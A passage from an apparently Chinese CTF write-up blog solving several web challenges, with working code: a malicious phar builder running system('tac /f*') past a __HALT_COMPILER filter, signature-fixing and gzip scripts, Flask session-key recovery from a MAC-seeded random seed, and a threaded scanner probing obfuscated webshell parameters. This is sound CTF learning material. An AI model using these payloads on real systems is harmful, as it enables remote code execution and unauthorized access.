class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接弹shell</p><p>根目录下有个flaaaag   TlNTQ1QK</p><p>&#x2F;home&#x2F;galf    RntmY2ZjYjIwNS1kZjFhLTQ2NWYtODMzOC0wYzRhMjM2MDEzNmF9Cg&#x3D;&#x3D;</p><p>抽象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;fcfcb205-df1a-465f-8338-0c4a2360136a&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2021-fake-game"><a href="#MoeCTF-2021-fake-game" class="headerlink" title="[MoeCTF 2021]fake game"></a>[MoeCTF 2021]fake game</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093337918.png" alt="image-20241222093337918"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093344765.png" alt="image-20241222093344765"></p><p>随便发个包，正常分配属性肯定是不行的。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093408857.png" alt="image-20241222093408857" style="zoom: 67%;" /><p>提示merge，原型链污染。</p><p>如果你将某一项属性值设为0，你将没有这项属性！</p><p>那么污染proto，当前找不到就找之前的，完美了。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093449718.png" alt="image-20241222093449718" style="zoom:67%;" /><h2 id="NSSRound-13-Basic-ez-factors"><a href="#NSSRound-13-Basic-ez-factors" class="headerlink" title="[NSSRound#13 Basic]ez_factors"></a>[NSSRound#13 Basic]ez_factors</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102504323.png" alt="image-20241222102504323"></p><p>因数分解</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102518573.png" alt="image-20241222102518573"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102526079.png" alt="image-20241222102526079"></p><p>发现只能输出数字。</p><p>那就用od，输出八进制</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102639428.png" alt="image-20241222102639428"></p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>一道phar反序列化题，但是跟之前做的不太一样</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222111208334.png" alt="image-20241222111208334"></p><p>有两个功能点</p><p>存在任意文件读取，先读取index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实就是要构造phar文件了。</p><p>再读取upload.php，查看相关过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现存在对__HALT_COMPILER();的检测。可以用两种方法来绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112240952.png" alt="image-20241222112240952"></p><p>来吧，先构造恶意phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里注意构造完要用winhex改属性数量！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line"> f = file.read()</span><br><span class="line">newf = gzip.compress(f) <span class="comment">#对Phar⽂件进⾏gzip压缩</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;capoo.gif&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:<span class="comment">#更改⽂件后缀</span></span><br><span class="line"> file.write(newf)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112644143.png" alt="image-20241222112644143"></p><p>尝试phar文件包含，他说broken signature，签名有问题？！</p><p>当我们更改test.phar文件的内容时，签名会变得无效，因此我们需要换一个签名！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112807470.png" alt="image-20241222112807470"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222113111949.png" alt="image-20241222113111949"></p><p>拿捏了！</p><h2 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h2><p>开局发现任意文件读取</p><p>python网站，那就直接读源码。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161153662.png" alt="image-20241222161153662"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>思路就是改session。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161704265.png" alt="image-20241222161704265"></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161718945.png" alt="image-20241222161718945" style="zoom:67%;" /><p>接下来如果我们能获取到secret_key那就大功告成了。</p><p>然后我发现了一个解题关键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>只要我们获取到uuid.getnode()，那么就知道种子了，就可以知道secret_key了.</p><p>uuid.getnode()返回计算机的<strong>网络接口卡（NIC）地址</strong>，通常是设备的 MAC 地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222162400463.png" alt="image-20241222162400463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:82:0a</span><br></pre></td></tr></table></figure><p>这道题前面写到过啊我丢，突然意识到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac02820a</span>)</span><br><span class="line">sec=<span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br></pre></td></tr></table></figure><p>这里踩到坑了，python2的环境！！！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222164000955.png" alt="image-20241222164000955"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222163953824.png" alt="image-20241222163953824"></p><p>这里不知道为啥不能用原来的格式，奇怪</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104912732.png" alt="image-20241223104912732"></p><p>给了源码</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104936822.png" alt="image-20241223104936822" style="zoom:80%;" /><p>一堆混淆过的不知道是啥的文件，超级多。</p><p>我们放d盾跑一下</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105009974.png" alt="image-20241223105009974" style="zoom:80%;" /><p>几乎都有问题，直接随便找一个试试。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105356197.png" alt="image-20241223105356197"></p><p>执行不了！</p><p>那就跑跑脚本，找出能执行的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间： &#x27;</span>+ time.asctime(time.localtime(time.time())))</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制线程的最大数量</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)</span><br><span class="line">filePath=<span class="string">r&#x27;D:\newphpstudy\phpstudy_pro\WWW\src&#x27;</span></span><br><span class="line">os.chdir(filePath)</span><br><span class="line"><span class="comment">#设置重连次数，防止线程过高，断开连接</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">files=os.listdir(filePath)</span><br><span class="line">session=requests.session()</span><br><span class="line"><span class="comment">#设置连接的活跃状态为false</span></span><br><span class="line">session.keep_alive=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="comment">#print(&#x27;tring  &#x27; + file + &#x27;   &#x27; + time.asctime(time.localtime(time.time())))</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        gets=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line">        posts=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line"></span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    params=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">        params[i]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">        data[j]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target=<span class="string">&quot;http://127.0.0.1/src/&quot;</span>+file</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(target)</span></span><br><span class="line">    res=session.post(target,data=data,params=params)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    res.close()</span><br><span class="line">    res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">            res=session.get(target+<span class="string">&#x27;?%s=&#x27;</span>%i+<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">                res = session.post(target,data=&#123;j:<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">            params=i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            params=j</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span> + file + <span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> % params)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间： &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    t=threading.Thread(target=get_content,args=(f,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><img 